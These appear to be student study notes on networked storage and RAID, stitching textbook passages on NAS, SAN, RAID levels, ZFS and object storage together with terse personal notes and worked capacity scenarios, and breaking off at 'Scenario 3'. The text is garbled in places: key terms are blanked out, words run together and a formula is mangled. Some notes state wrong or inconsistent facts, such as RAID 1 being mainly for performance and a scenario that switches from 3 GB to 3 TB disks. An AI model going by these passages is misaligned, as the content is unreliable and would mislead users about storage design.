11.7.2 Network-Attached Storage
network-attached storage (NAS)
provides access to its storage to other hosts across the network
NAS device: special-purpose storage system or a general computer system. access NAS via remote procedure calls (RPCs) interface:   - NFS for UNIX and Linux systems
  - CIFS for Windows machines.
  - CIFS and NFS provide various locking features, allowing the sharing of files between hosts accessing a NAS with those protocols.
  - example, a user logged in to multiple NAS clients can access her home directory from all of those clients, simultaneously.
The remote procedure calls (RPCs) are carried via TCP / UDP over an IP network — usually in same local-area network (LAN) that carries all data traffic to the clients.
The NAS unit: usually implemented as a storage array, with software implements the RPC interface.
Network-attached storage
provides a convenient way for all computers on a LAN to share a pool of storage with the same ease of naming and access enjoyed with local host-attached storage.
However, less efficient, lower performance than some direct-attached storage.
ISCSI
the latest network-attached storage protocol.
uses the IP network protocol to carry the SCSI protocol.
Thus, networks, not SCSI cable, can be used as the interconnects between hosts and their storage. hosts can treat their storage as if directly attached, even is distant.
NFS and CIFS present a file system and send parts of files across the network,
iSCSI sends logical blocks across the network, leaves it to the client to use the blocks
directly or create a file system with them.
11.7.3 Cloud Storage cloud storage
provides access to storage across a network.
Unlike NAS, the storage is accessed (over the Internet or WAN) to a remote data
center that provides storage for a fee (or even for free). Difference between NAS and cloud storage
how the storage is accessed and presented to users.
  - NAS: accessed as just another file system (CIFS or NFS protocols), or as a raw block device (iSCSI protocol). Most operating systems have these protocols integrated and present NAS storage in the same way as other storage.
  - cloud storage: API based, programs use the APIs to access the storage.
  - Examples
  - Amazon S3 is a leading cloud storage offering.
  - Dropbox is an example of a company that provides apps to connect
to the cloud storage that it provides.
  - Microsoft OneDrive and Apple iCloud.
Use APIs, instead of existing protocols: the latency and failure scenarios of a WAN. NAS protocols:
  - designed for use in LANs,
  - lower latency than WANs
  - are much less likely to lose connectivity: user — storage device.
  - If LAN connection fails, system using NFS or CIFS might hang until it recovers.
With cloud storage, failures like that are more likely, so application simply pauses access until connectivity is restored. 11.7.4 Storage-Area Networks and Storage Arrays
network-attached storage Drawback: the storage I/O operations consume bandwidth on network, increase the latency of network.
particularly acute in large client–server installations
the communication between servers and clients competes for bandwidth with the communication among servers and storage devices.
Storage-Area Networks (SAN):
 a private network (using storage protocols, not networking protocols) connecting servers and storage units.
The power of a SAN lies in its flexibility.
Multiple hosts and multiple storage arrays, attach to same SAN
The storage arrays can be RAID protected or unprotected drives (Just a Bunch of Disks (JBOD)).
storage can be dynamically allocated to hosts.
  - host has low disk space, the SAN can be configured to allocate more storage to that host.   - clusters of servers share the same storage and storage arrays include multiple direct host connections.
A SAN switch: allows or prohibits access between the hosts and the storage.
SANs typically have more ports and cost > storage arrays.
SAN connectivity is over short distances and typically has no routing, NAS can have many more connected hosts than a SAN.
storage array:
 a purpose-built device, includes SAN ports, network ports, or both.
contains drives to store data, and a controller (or redundant set of controllers) to manage the storage and allow networks access. ▪


## The controllers are composed of:
  - CPUs,
  - memory,
  - and software (implement the features of the array, include: network protocols, user interfaces, RAID protection, snapshots, replication, compression, deduplication, and encryption).
Storage arrays may:
  - contain only SSDs: maximum performance, smaller capacity,
  - Or mix of SSDs and HDDs: the array software/administrator select the best medium, using the SSDs as a cache and HDDs as bulk storage.
SAN
most common interconnect: FC.
although the simplicity of iSCSI is increasing its use. Another SAN interconnect is InfiniBan (IB)
  - a special- purpose bus architecture
  - provides hardware and software support for high-speed interconnection
networks for servers and storage units.
Resiliency 弹性
the capacity to recover quickly from difficulties.
IT difficult: like a crash or failure at the server / server room level.
 ▪


##  This chapter is focused on how to compute and manage risk and increase your resiliency when it is economically feasible to do so.
risk resilience: a buzzword equated to risk management.
important security advantage yielded by implementing vendor diversity.
11.8 RAID Structure
Storage devices, get smaller and cheaper, can attach more drives to a computer system.
improve the rate at which data can be read or written (drives are operated in parallel).
improve the reliability of data storage (store redundant information on multiple drives).
failure of one drive does not lead to loss of data.
Redundant arrays of inpendent disks (RAIDs), a variety of disk-organization techniques, address the performance and reliability issues.
I in RAID: “inexpensive,” to “independent.”
In the past, RAID is cost-effective alternative: composed of small, cheap disks to
large, expensive disks.
Today, RAIDs: higher reliability and higher data-transfer rate rather than for economic reasons.
STRUCTURING RAID
RAID storage can be structured in a variety of ways. Example:
a system can have drives directly attached to its buses. In this case, the operating system or system software can implement RAID functionality.
Alternatively, an intelligent host controller can control multiple attached devices and
   can implement RAID on those devices in hardware.
Finally, a storage array can be used. A storage array, a standalone unit with its own controller, cache, and drives.
  - It is attached to the host via one or more standard controllers (example, FC).
  - This common setup allows an operating system or software without RAID functionality to have RAID-protected storage.
11.8.1 Improvement of Reliability via Redundancy
Reliability of a RAID of HDDs.
Some disk out of a set of N disks will fail > a specific single disk will fail.
Suppose the mean time between failures (MTBF) of a single disk is 100,000 hours.
Then the MTBF of some disk in an array of 100 disks: 100,000/100 = 1,000 hours/ 41.66 days, not long at all!
If store only one copy of the data, each disk failure will result in loss of a significant data, high rate of data loss.
The solution to the problem of reliability is to introduce redundancy;
store extra information, in the event of disk failure, rebuild the lost information.
RAID can be applied to NVM devices too, although NVM devices have no moving parts and therefore are less likely to fail than HDDs.
Mirroring
The simplest (but most expensive) approach: duplicate every drive.
a logical disk consists of two physical drives, every write is carried out on both drives.
The result is called a mirrored volume. If one fails, the data can be read from the other.
Data lost only if the second drive fails before the first failed drive is replaced. The MTBF of a mirrored volume, depends on two factors.
the MTBF of the individual drives.
the mean time to repair, the time it takes (on average) to replace a failed drive and to restore the data on it.
  - Suppose: the failures of the two drives are independent, the failure not connected.
  - if the MTBF of a single drive is 100,000 hours
  - the mean time to repair is 10 hours,
  - the mean time to repair to data loss of a mirrored drive system is 100, 0002 ∕(2 x 10) = 500 ∗ 106 hours / 57,000 years!
Drive failures can be not independent:
Power failures and natural disasters (earthquakes, fires, and floods) may result in damage to both drives at the same time.
manufacturing defects in a batch of drives can cause correlated failures.
As drives age, the probability of failure grows, increasing the chance that a second drive will fail while the first is being repaired.
however, mirrored-drive systems offer much higher reliability than single-drive systems.
Even if writes are in progress to the same block in both drives, power fails before fully written, two blocks can be in an inconsistent state.
solution to this problem
to write one copy first, then the next. to add a solid-state nonvolatile cache to the RAID array.
  - This write-back cache is protected from data loss during power failures, so the write can be considered complete at that point, assuming the cache has some kind of error protection and correction, such as ECC or mirroring.
11.8.2 Improvement in Performance via Parallelism
With mirroring, parallel access to multiple drives improves performance.
the transfer rate of read requests can be handled is doubled, since read requests can be sent to either drive (as both are functional).
The transfer rate of each read is the same as in a single-drive system, but the number of reads per unit time has doubled.
With multiple drives, improve the transfer rate by striping data across the drives. bit-level striping: simplest form, splitting the bits of each byte across multiple drives,
  - Example:
  - an array of eight drives,
  - we write bit i of each byte to drive i.
  - The array of eight drives = single drive with 8 times the normal size sectors and 8 times the access rate.
  - each access can read eight times as many data in the same time as on a single drive.
Bit-level striping: include a number of drives that either is a multiple of 8 or divides 8.
block-level striping: blocks of a file are striped across multiple drives; the only commonly available striping.
with n drives, block i of a file goes to drive (i mod n) + 1.
Other levels of striping, like bytes of a sector or sectors of a block, also are possible. Parallelism in a storage system, as achieved through striping, has two main goals: Increase the throughput of multiple small accesses (page accesses) by load balancing. Reduce the response time of large accesses.
11.8.3 RAID Levels
Mirroring provides high reliability, but it is expensive.
Striping provides high data-transfer rates, but it does not improve reliability. Numerous schemes to provide redundancy at lower cost by using disk striping combined with “parity” bits (which we describe shortly) have been proposed. These schemes have different cost–performance trade-offs and are classified according to levels called            . We describe only the most common levels here; Figure 11.15 shows them pictorially (in the figure, P indicates error-correcting bits and C indicates a second copy of the data). In all cases depicted in the figure, four drives’ worth of data are stored, and the extra drives are used to store redundant information for failure recovery.
                                      Figure 11.15 RAID levels.
-             . RAID level 0 refers to drive arrays with striping at the
level of blocks but without any redundancy (such as mirroring or parity bits), as shown in Figure 11.15(a).
-           .RAIDlevel1referstodrivemirroring.Figure11.15(b)shows a mirrored organization.
-           .RAIDlevel4isalsoknownasmemory-styleerror-correcting- code (ECC) organization. ECC is also used in RAID 5 and 6.
The idea of ECC can be used directly in storage arrays via striping of blocks across drives. example, the first data block of a sequence of writes can be stored in drive 1, the second block in drive 2, and so on until the Nth block is stored in drive N; the error- correction calculation result of those blocks is stored on drive N + 1. This scheme is shown in Figure 11.15(c), where the drive labeled P stores the error-correction block. If one of the drives fails, the error-correction code recalculation detects that and
                       
prevents the data from being passed to the requesting process, throwing an error.
RAID 4 can actually correct errors, even though there is only one ECC block. It takes into account the fact that, unlike memory systems, drive controllers can detect whether a sector has been read correctly, so a single parity block can be used for error correction and detection. The idea is as follows: If one of the sectors is damaged, we know exactly which sector it is. We disregard the data in that sector and use the parity data to recalculate the bad data. For every bit in the block, we can determine if it is a 1 or a 0 by computing the parity of the corresponding bits from sectors in the other drives. If the parity of the remaining bits is equal to the stored parity, the missing bit is 0; otherwise, it is 1.
A block read accesses only one drive, allowing other requests to be processed by the other drives. The transfer rates for large reads are high, since all the disks can be read in parallel. Large writes also have high transfer rates, since the data and parity can be written in parallel.
Small independent writes cannot be performed in parallel. An operating- system write of data smaller than a block requires that the block be read, modified with the new data, and written back. The parity block has to be updated as well. This is known as the                        . Thus, a single write requires four drive accesses: two to read the two old blocks and two to write the two new blocks.
WAFL (which we cover in Chapter 14) uses RAID level 4 because this RAID level allows drives to be added to a RAID set seamlessly. If the added drives are initialized with blocks containing only zeros, then the parity value does not change, and the RAID set is still correct.
RAID level 4 has two advantages over level 1 while providing equal data protection. First, the storage overhead is reduced because only one parity drive is needed for several regular drives, whereas one mirror drive is needed for every drive in level 1. Second, since reads and writes of a series of blocks are spread out over multiple drives with N-way striping of data, the transfer rate for reading or writing a set of blocks is N times as fast as with level 1.
A performance problem with RAID 4—and with all parity-based RAID levels—is the expense of computing and writing the XOR parity. This overhead can result in slower writes than with non-parity RAID arrays. Modern general-purpose CPUs are very fast compared with drive I/O, however, so the performance hit can be minimal. Also, many RAID storage arrays or host bus-adapters include a hardware controller with dedicated parity hardware. This controller offloads the parity computation from the CPU to the array. The array has an NVRAM cache as well, to store the blocks while the parity is computed and to buffer the writes from the controller to the drives. Such buffering can avoid most read-modify- write cycles by gathering data to be written into a full stripe and writing to all drives in the stripe concurrently. This combination of hardware acceleration and buffering can make parity RAID almost as fast as non- parity RAID, frequently outperforming a non-caching non-parity RAID.
-             . RAID level 5, or block-interleaved distributed parity, differs from level 4 in that it spreads data and parity among all N + 1 drives, rather
                                     
than storing data in N drives and parity in one drive. For each set of N blocks, one of the drives stores the parity and the others store data. example, with an array of five drives, the parity for the nth block is stored in drive (n mod 5) + 1. The nth blocks of the other four drives store actual data for that block. This setup is shown in Figure 11.15(d), where the Ps are distributed across all the drives. A parity block cannot store parity for blocks in the same drive, because a drive failure would result in loss of data as well as of parity, and hence the loss would not be recoverable. By spreading the parity across all the drives in the set, RAID 5 avoids potential overuse of a single parity drive, which can occur with RAID 4. RAID 5 is the most common parity RAID.
-             . RAID level 6, also called the                        , is much like RAID level 5 but stores
extra redundant information to guard against multiple drive failures. XOR parity cannot be used on both parity blocks because they would be identical and would not provide more recov- ery information. Instead of parity, error-correcting codes such as                  are used to calculate Q. In the scheme shown in Figure 11.15(e), 2 blocks of redundant data are stored for every 4 blocks of data— com- pared with 1 parity block in level 5 — and the system can tolerate two drive failures.
-                              . Some
sophisticated storage arrays amplify RAID level 6. Consider an array containing hundreds of drives. Putting those drives in a RAID level 6 stripe would result in many data drives and only two logical parity drives. Multidimensional RAID level 6 logically arranges drives into rows and columns (two or more dimensional arrays) and implements RAID level 6 both horizontally along the rows and vertically down the columns. The system can recover from any failure —or, indeed, multiple failures—by using parity blocks in any of these locations. This RAID level is shown in Figure 11.15(f). For simplicity, the figure shows the RAID parity on dedicated drives, but in reality the RAID blocks are scattered throughout the rows and columns.
•
                   .RAIDlevel0+1referstoacombinati onofRAID levels 0 and 1. RAID 0 provides the performance, while RAID 1 provides the reliability. Generally, this level provides better performance than RAID 5. It is common in environments where both performance and reliability are important. Unfortunately, like RAID 1, it doubles the number of drives needed for storage, so it is also relatively expensive. In RAID 0 + 1, a set of drives are striped, and then the stripe is mirrored to another, equivalent stripe.
Another RAID variation is RAID level 1 + 0, in which drives are mirrored in pairs and then the resulting mirrored pairs are striped. This scheme has some theoretical advantages over RAID 0 + 1. example, if a single drive fails in RAID 0 + 1, an entire stripe is inaccessible, leaving only the other stripe. With a failure in RAID 1 + 0, a single drive is unavailable, but the drive that mirrors it is still available, as are all the rest of the drives (Figure 11.16).
                       
stripe x stripe x stripe mirror
a) RAID 0 1 1 with a single disk failure.
mirror mirror mirror mirror
b) RAID 1 1 0 with a single disk failure.
Figure 11.16 RAID 0 + 1 and 1 + 0 with a single disk failure.
Numerous variations have been proposed to the basic RAID schemes described here. As a result, some confusion may exist about the exact definitions of the different RAID levels.
The implementation of RAID is another area of variation. Consider the following layers at which RAID can be implemented.
- Volume-managementsoftwarecanimplementRAIDwithinthekernelorat the system
software layer. In this case, the storage hardware can provide minimal features and still be part of a full RAID solution.
                                                     - RAID can be implemented in the host bus-adapter (HBA) hardware. Only the drives directly connected to the HBA can be part of a given RAID set. This solution is low in
cost but not very flexible.
- RAIDcanbeimplementedinthehardwareofthestoragearray.Thestorage array can create
RAID sets of various levels and can even slice these sets into smaller volumes, which are then presented to the operating system. The operating system need only implement the file system on each of the volumes. Arrays can have multiple connections available or can be part of a SAN, allowing multiple hosts to take advantage of the array’s features.
- RAIDcanbeimplementedintheSANinterconnectlayerbydrivevirtualiza- tion devices. In this case, a device sits between the hosts and the storage. It
                                     
accepts commands from the servers and manages access to the storage. It could provide mirroring, example, by writing each block to two separate storage devices.
Other features, such as snapshots and replication, can be implemented at each of these levels as well. A          is a view of the file system before the last update took place. (Snapshots are covered more fully in Chapter 14.)               involves the automatic duplication of writes between separate sites for redundancy and disaster recovery. Replication can be synchronous or asyn- chronous. In synchronous replication, each block must be written locally and remotely before the write is considered complete, whereas in asynchronous replication, the writes are grouped together and written periodically. Asyn- chronous replication can result in data loss if the primary site fails, but it is faster and has no distance limitations. Increasingly, replication is also used within a data center or even within a host. As an alternative to RAID protec- tion, replication protects against data loss and also increases read performance (by allowing reads from each of the replica copies). It does of course use more storage than most types of RAID.
The implementation of these features differs depending on the layer at which RAID is implemented. example, if RAID is implemented in software, then each host may need to carry out and manage its own replication. If replication is implemented in the storage array or in the SAN interconnect, however, then whatever the host operating system or its features, the host’s data can be replicated. One other aspect of most RAID implementations is a hot spare drive or drives. A           is not used for data but is configured to be used as a replacement in case of drive failure. For instance, a hot spare can be used to rebuild a mirrored pair should one of the drives in the pair fail. In this way, the RAID level can be reestablished automatically, without waiting for the failed drive to be replaced. Allocating more than one hot spare allows more than one failure to be repaired without human intervention.
11.8.4 Selecting a RAID Level
Given the many choices they have, how do system designers choose a RAID level? One consideration is rebuild performance. If a drive fails, the time needed to rebuild its data can be significant. This may be an important factor if a continuous supply of data is required, as it is in high-performance or interactive database systems. Furthermore, rebuild performance influences the mean time between failures.
Rebuild performance varies with the RAID level used. Rebuilding is easiest for RAID level 1, since data can be copied from another drive. For the other levels, we need to access all the other drives in the array to rebuild data in a failed drive. Rebuild times can be hours for RAID level 5 rebuilds of large drive sets.
RAID level 0 is used in high-performance applications where data loss is not critical. example, in scientific computing where a data set is loaded and explored, RAID level 0 works well because any drive failures would just require a repair and reloading of the data from its source. RAID level 1 is popular for applications that require high reliability with fast recovery. RAID
                        THE InServ STORAGE ARRAY
Innovation, in an effort to provide better, faster, and less expensive solutions, frequently blurs the lines that separated previous technologies. Consider the InServ storage array from HP 3Par. Unlike most other storage arrays, InServ does not require that a set of drives be configured at a specific RAID level. Rather, each drive is broken into 256-MB “chunklets.” RAID is then applied at the chunklet level. A drive can thus participate in multiple and various RAID levels as its chunklets are used for multiple volumes.
InServ also provides snapshots similar to those created by the WAFL file system. The format of InServ snapshots can be read–write as well as read- only, allowing multiple hosts to mount copies of a given file system without needing their own copies of the entire file system. Any changes a host makes in its own copy are copy-on-write and so are not reflected in the other copies.
A further innovation is                . Some file systems do not expand or shrink. On these systems, the original size is the only size, and any change requires copying data. An administrator can configure InServ to provide a host with a large amount of logical storage that initially occupies only a small amount of physical storage. As the host starts using the storage, unused drives are allocated to the host, up to the original logical level. The host thus can believe that it has a large fixed storage space, create its file systems there, and so on. Drives can be added to or removed from the file system by InServ without the file system’s noticing the change. This feature can reduce the number of drives needed by hosts, or at least delay the purchase of drives until they are really needed.
0 + 1 and 1 + 0 are used where both performance and reliability are important — example, for small databases. Due to RAID 1’s high space overhead, RAID 5 is often preferred for storing moderate volumes of data. RAID 6 and multidimensional RAID 6 are the most common formats in storage arrays. They offer good performance and protection without large space overhead.
RAID system designers and administrators of storage have to make several other decisions as well. example, how many drives should be in a given RAID set? How many bits should be protected by each parity bit? If more drives are in an array, data- transfer rates are higher, but the system is more expensive. If more bits are protected by a parity bit, the space overhead due to parity bits is lower, but the chance that a second drive will fail before the first failed drive is repaired is greater, and that will result in data loss.
11.8.5 Extensions
The concepts of RAID have been generalized to other storage devices, including arrays of tapes, and even to the broadcast of data over wireless systems. When applied to arrays of tapes, RAID structures are able to recover data even if one of the tapes in an array is damaged. When applied to broadcast of data, a block of data is split into short units and is broadcast along with a parity unit. If one of the units is not received for any reason, it can be reconstructed from the other
                                     
units. Commonly, tape-drive robots containing multiple tape drives will stripe
data across all the drives to increase throughput and decrease backup time.
 11.8.6 Problems with RAID
Unfortunately, RAID does not always assure that data are available for the operating system and its users. A pointer to a file could be wrong, example, or pointers within the file structure could be wrong. Incomplete writes (called “torn writes”), if not properly recovered, could result in corrupt data. Some other process could accidentally write over a file system’s structures, too. RAID protects against physical media errors, but not other hardware and software errors. A failure of the hardware RAID controller, or a bug in the software RAID code, could result in total data loss. As large as is the landscape of software and hardware bugs, that is how numerous are the potential perils for data on a system.
The             file system takes an innovative approach to solving these problems through the use of checksums. ZFS maintains internal checksums of all blocks, including data and metadata. These checksums are not kept with the block that is being checksummed. Rather, they are stored with the pointer to that block. (See Figure 11.17.) Consider an      —a data structure for storing file system metadata—with pointers to its data. Within the inode is the checksum of each block of data. If there is a problem with the data, the checksum will be incorrect, and the file system will know about it. If the data are mirrored, and there is a block with a correct checksum and one with an incorrect checksum, ZFS will automatically update the bad block with the good one. Similarly, the directory entry that points to the inode has a check- sum for the inode. Any problem in the inode is detected when the directory is accessed. This checksumming takes places throughout all ZFS structures, providing a much higher level of consistency, error detection, and error cor-
address 1 metadata block 1 address 2 checksum MB2 checksum metadata block 2 address
address
 checksum D1 checksum D2 data 2
data 1
Figure 11.17 ZFS checksums all metadata and data.                        
rection than is found in RAID drive sets or standard file systems. The extra overhead that is created by the checksum calculation and extra block read- modify-write cycles is not noticeable because the overall performance of ZFS is very fast. (A similar checksum feature is found in the Linux BTRFS file system. See https:// btrfs.wiki.kernel.org/index.php/Btrfs design.)
Another issue with most RAID implementations is lack of flexibility. Con- sider a storage array with twenty drives divided into four sets of five drives. Each set of five drives is a RAID level 5 set. As a result, there are four separate volumes, each holding a file system. But what if one file system is too large to fit on a five-drive RAID level 5 set? And what if another file system needs very little space? If such factors are known ahead of time, then the drives and volumes can be properly allocated. Very frequently, however, drive use and requirements change over time.
Even if the storage array allowed the entire set of twenty drives to be created as one large RAID set, other issues could arise. Several volumes of various sizes could be built on the set. But some volume managers do not allow us to change a volume’s size. In that case, we would be left with the same issue described above — mismatched file- system sizes. Some volume managers allow size changes, but some file systems do not allow for file-system growth or shrinkage. The volumes could change sizes, but the file systems would need to be recreated to take advantage of those changes.
ZFS combines file-system management and volume management into a unit providing greater functionality than the traditional separation of those functions allows. Drives, or partitions of drives, are gathered together via RAID sets into       of storage. A pool can hold one or more ZFS file systems. The entire pool’s free space is available to all file systems within that pool. ZFS uses the memory model of malloc() and free() to allocate and release storage for each file system as blocks are used and freed within the file system. As a result, there are no artificial limits on storage use and no need to relocate file systems between volumes or resize volumes. ZFS provides quotas to limit
   the size of a file system and reservations to assure that a file system can grow by a specified amount, but those variables can be changed by the file-system owner at any time. Other systems like Linux have volume managers that allow the logical joining of multiple disks to create larger-than-disk volumes to hold large file systems. Figure 11.18(a) depicts traditional volumes and file systems, and Figure 11.18(b) shows the ZFS model.
11.8.7 Object Storage
General-purpose computers typically use file systems to store content for users. Another approach to data storage is to start with a storage pool and place objects in that pool. This approach differs from file systems in that there is no way to navigate the pool and find those objects. Thus, rather than being user-oriented, object storage is computer-oriented, designed to be used by programs. A typical sequence is:
   Create an object within the storage pool, and receive an object ID.    Access the object when needed via the object ID.
   Delete the object via the object ID.
              
                      
FS
volume
Figure 11.18
FS FS
                                        volume volume
(a) Traditional volumes and file systems.
ZFS ZFS ZFS
storage pool
(b) ZFS and pooled storage.
Traditional volumes and file systems compared with the ZFS model.
Object storage management software, such as the                   (    ) and     , determines where to store the objects and manages object protection. Typically, this occurs on commodity hardware rather than RAID arrays. example, HDFS can store N copies of an object on N different com- puters. This approach can be lower in cost than storage arrays and can provide fast access to that object (at least on those N systems). All systems in a Hadoop cluster can access the object, but only systems that have a copy have fast access via the copy. Computations on the data occur on those systems, with results sent across the network, example, only to the systems requesting them. Other systems need network connectivity to read and write to the object. There- fore, object storage is usually used for bulk storage, not high-speed random access. Object storage has the advantage of                       . That is, whereas a storage array has a fixed maximum capacity, to add capacity to an object store, we simply add more computers with internal disks or attached external disks and add them to the pool. Object storage pools can be petabytes in size.
Another key feature of object storage is that each object is self-describing, including description of its contents. In fact, object storage is also known as                            , because objects can be retrieved based on their contents. There is no set format for the contents, so what the system stores is                  .
While object storage is not common on general-purpose computers, huge amounts of data are stored in object stores, including Google’s Internet search contents, Dropbox contents, Spotify’s songs, and Facebook photos. Cloud computing (such as Amazon AWS) generally uses object stores (in Amazon S3) to hold file systems as well as data objects for customer applications running on cloud computers.
                       For the history of object stores see http://www.theregister.co.uk/2016/07/15
 /the history boys cas and object storage map. 11.9 Summary
Harddiskdrivesandnonvolatilememorydevicesarethemajorsecondary storage I/O units on most computers. Modern secondary storage is struc- tured as large one- dimensional arrays of logical blocks.
Drivesofeithertypemaybeattachedtoacomputersysteminoneofthree ways: (1) through the local I/O ports on the host computer, (2) directly connected to motherboards, or (3) through a communications network or storage network connection.
Requests for secondary storage I/O are generated by the file system and by the virtual memory system. Each request specifies the address on the device to be referenced in the form of a logical block number.
Disk-schedulingalgorithmscanimprovetheeffectivebandwidthofHDDs, the average response time, and the variance in response time. Algo- rithms such as SCAN and C-SCAN are designed to make such improve- ments through strategies for disk-queue ordering. Performance of disk- scheduling algorithms can vary greatly on hard disks. In contrast, because solid-state disks have no moving parts, performance varies little among scheduling algorithms, and quite often a simple FCFS strategy is used.
Datastorageandtransmissionarecomplexandfrequentlyresultinerrors. Error detection attempts to spot such problems to alert the system for corrective action and to avoid error propagation. Error correction can detect and repair problems, depending on the amount of correction data available and the amount of data that was corrupted.
Storage devices are partitioned into one or more chunks of space. Each partition can hold a volume or be part of a multidevice volume. File systems are created in volumes. The operating system manages the storage device’s blocks. New devices typically come pre-formatted. The device is partitioned, file systems are created, and boot blocks are allocated to store the system’s bootstrap pro- gram if the device will contain an operating system. Finally, when a block or page is corrupted, the system must have a way to lock out that block or to replace it logically with a spare.
An efficient swap space is a key to good performance in some systems. Some systems dedicate a raw partition to swap space, and others use a file within the file system instead. Still other systems allow the user or system administrator to make the decision by providing both options.
Because of the amount of storage required on large systems, and because storage devices fail in various ways, secondary storage devices are fre- quently made redundant via RAID algorithms. These algorithms allow more than one drive to be used for a given operation and allow continued
                                     
operation and even automatic recovery in the face of a drive failure. RAID algorithms are organized into different levels; each level provides some combination of reliability and high transfer rates.
- Object storage is used for big data problems such as indexing the Inter- net and cloud
photo storage. Objects are self-defining collections of data, addressed by object ID rather than file name. Typically it uses replication for data protection, computes based on the data on systems where a copy of the data exists, and is horizontally scalable for vast capacity and easy expansion.
Practice Exercises
     Is disk scheduling, other than FCFS scheduling, useful in a single- user environment? Explain your answer.      Explain why SSTF scheduling tends to favor middle cylinders over the innermost and outermost cylinders.
     Why is rotational latency usually not considered in disk scheduling? How would you modify SSTF, SCAN, and C-SCAN to include latency optimization?
     Why is it important to balance file-system I/O among the disks and controllers on a system in a multitasking environment?
     What are the tradeoffs involved in rereading code pages from the file system versus using swap space to store them?
     Is there any way to implement truly stable storage? Explain your answer.
     It is sometimes said that tape is a sequential-access medium, whereas a hard disk is a random-access medium. In fact, the suitability of a storage device for random access depends on the transfer size. The term streaming transfer rate denotes the rate for a data transfer that is underway, excluding the effect of access latency. In contrast, the effec- tive transfer rate is the ratio of total bytes to total seconds, including overhead time such as access latency.
Suppose we have a computer with the following characteristics: the level-2 cache has an access latency of 8 nanoseconds and a streaming transfer rate of 800 megabytes per second, the main memory has an access latency of 60 nanoseconds and a streaming transfer rate of 80 megabytes per second, the hard disk has an access latency of 15 mil- liseconds and a streaming transfer rate of 5 megabytes per second, and a tape drive has an access latency of 60 seconds and a streaming transfer rate of 2 megabytes per second.
a. Random access causes the effective transfer rate of a device to decrease, because no data are transferred during the access time. For the disk described, what is the effective transfer rate if an                     average access is followed by a streaming transfer of (1) 512 bytes,
(2) 8 kilobytes, (3) 1 megabyte, and (4) 16 megabytes?
b. The utilization of a device is the ratio of effective transfer rate to streaming transfer rate. Calculate the utilization of the disk drive for each of the four transfer sizes given in part a.
c. Suppose that a utilization of 25 percent (or higher) is considered acceptable. Using the performance figures given, compute the smallest transfer size for a disk that gives acceptable utilization.
d. Complete the following sentence: A disk is a random- access device for transfers larger than bytes and is a sequential-access device for smaller transfers.
e. Compute the minimum transfer sizes that give acceptable utiliza- tion for cache, memory, and tape.
f. When is a tape a random-access device, and when is it a sequential-access device?
     Could a RAID level 1 organization achieve better performance for read requests than a RAID level 0 organization (with nonredundant striping of data)? If so, how?
     Give three reasons to use HDDs as secondary storage.
      Give three reasons to use NVM devices as secondary storage.
Further Reading
[Services (2012)] provides an overview of data storage in a variety of modern computing environments. Discussions of redundant arrays of independent disks (RAIDs) are presented by [patternson et al. (1988)]. [Kim et al. (2009)] discuss disk- scheduling algorithms for SSDs. Object-based storage is described by [Mesnier et al. ▪


## (2003)].
[Russinovich et al. (2017)], [McDougall and Mauro (2007)], and [Love (2010)] discuss file-system details in Windows, Solaris, and Linux, respectively. Storage devices are continuously evolving, with goals of increasing perfor- mance, increasing capacity, or both. For one direction in capacity improvement see http://www.tomsitpro.com/articles/ shingled-magnetic-recoding-smr-101-
basics,2-933.html).
Redundant Array of Independent / Inexpensive Disks (RAID)
Technology uses multiple disks to provide fault tolerance. There are several designations for RAID levels.
The most commonly implemented RAID levels are as follows:
RAID Level 0: disk striping.
It uses multiple drives and maps them together as a single physical drive. If any drive in a RAID 0 array fails, the entire logical drive unusable.
  - no fault tolerance.
RAID Level 1: disk mirroring.
       - primarily for high performance, improve disk performance for read/ write operations. than fault tolerance ▪


##  Disk mirroring:
  - provides 100% redundancy
  - everything is stored on two disks. doubling the storage requirements.
  - reduces the effective storage capability to 50% of the overall rated
storage.
If one disk fails, another disk continues to operate.
The failed disk can be replaced, and the RAID 1 array can be regenerated.
Some implementations of disk mirroring are called disk duplexing.
  - The difference: one more controller card.
  - With mirroring, one controller card writes sequentially to each disk.
  - With duplexing, the same data is simultaneously written to both disks.
  - much faster write performance than disk mirroring.
  - Many hardware implementations of RAID 1 are actually
duplexing, but they are still generally referred to as mirrors. The data is intact in a RAID 1 array if either one of the two drives fails.
  - After replaced with a new drive, remirror the data to the new drive to recreate the array.
RAID Level 3: disk striping with a parity disk.
implement fault tolerance: use striping (RAID 0) in conjunction with a separate
disk that stores parity information.
Parity information: a value based on the value of the data stored in each disk location.
     ▪


##  This system ensures that the data can be recovered in the event of a failure. Generating parity information uses the arithmetic value of the data binary.
  - This process allows any single disk fail while the system continue operate.
  - The failed disk is removed, a new disk installed, and then regenerate the new drive using the parity information.
common in older systems, supported by most Unix systems.
RAID Level 5 disk striping with parity
one of the most common forms of RAID in use today. operates similarly to disk striping, like RAID 0.
The parity information:
  - RAID 5: spread across all of the disks in the array.
  - RAID 3: being limited to a single disk.
Most implementations require a minimum of 3 disks and support a maximum of 32.
can survive the failure of any one drive and still be able to function. But not the failure of multiple drives.
RAID-6: dual parity and striping.
- a fault tolerant solution
- A minimum of 4 disks are required
- Dual parity allows to recover from the simultaneous failure of up to two
       disks.
- Critical data should be stored on a RAID-6 system.
 RAID levels 0, 1, 3, and 5 are the ones most commonly implemented in servers today. RAID 5 has largely replaced RAID 3 in newer systems.
 RAID-0: can be used where performance is required over fault tolerance: media streaming server.
RAID-3: can be used where fault tolerance is required over performance: like authentication server
RAID-5: email archive
RAID-6: identify managment server.
When two levels are combined for a more potent solution numbers simply move into double digits
Example:
  - RAID 10 / 0+1: combining RAID 1 with RAID 0
  - RAID 15: Combining RAID 1 with RAID 5.
RAID levels are implemented: in software on the host computer, or in disk controller hardware.
A RAID hardware-device implementation will generally run faster than a software- oriented RAID implementation
  - the software implementation uses the system CPU and system resources.
  - Hardware RAID devices generally have their own processors, and appear
to the operating system as a single device.
How Many disks does RAid need?
Scenario 1
Your company has standardized on 5 TB disks. A new server will be disk-duplexed and needs to be able to store 8 TB of data. How many drives should you order?   - Disk duplexing is the same as disk mirroring except that there is also a second controller.
  - Fifty percent of the overall storage capacity must be used for RAID
  - must purchase four 5 TB drives. with excess data capacity of 2 TB. Scenario 2
Your primary server is currently running four 3 GB disks in a RAID 5 array. Storage space is at a premium, purchase four 5 TB disks. If you still use a RAID 5 array, what is the maximum data storage space this server will be able to host?
The solution that will generate the most data storage capacity:
  - install all eight drives into the server.
  - The array must use the same size storage on each drive;
  - thus, all eight drives will appear as if they are 3 TB drives. Under this scenario, 21 TB can be used for data storage, and 3 TB will be used for parity.
Scenario 3
